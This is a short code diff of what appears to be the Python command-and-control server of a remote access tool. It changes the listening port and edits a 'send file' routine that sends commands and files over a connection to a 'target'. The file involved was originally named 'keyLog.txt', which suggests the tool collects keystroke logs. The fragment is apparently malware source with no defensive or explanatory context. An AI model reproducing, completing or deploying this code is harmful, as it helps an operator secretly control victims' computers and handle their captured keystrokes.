@@ -22,7 +22,7 @@ def create_socket():
         global port
         global s
         host = ""
-        port = 9999
+        port = 5001
         s = socket.socket()
 
     except socket.error as msg:
@@ -139,11 +139,12 @@ def send_target_commands(conn):
                 break
             if cmd == 'send file' :
                 # filename = input("Enter the File Name :- ")
-                filename = 'keyLog.txt'
+                filename = 'logs.txt'
                 filename = str(filename)
                 filesize = os.path.getsize(filename)
-                conn.send(str.encode(cmd))
-                conn.send(f"{filename}{SEPARATOR}{filesize}".encode())
+                print(filesize)
+                # conn.send(str.encode(cmd))
+                conn.send(f"{cmd}{SEPARATOR}{filename}{SEPARATOR}{filesize}".encode())
                 # start sending the file
                 progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                 with open(filename, "rb") as f:
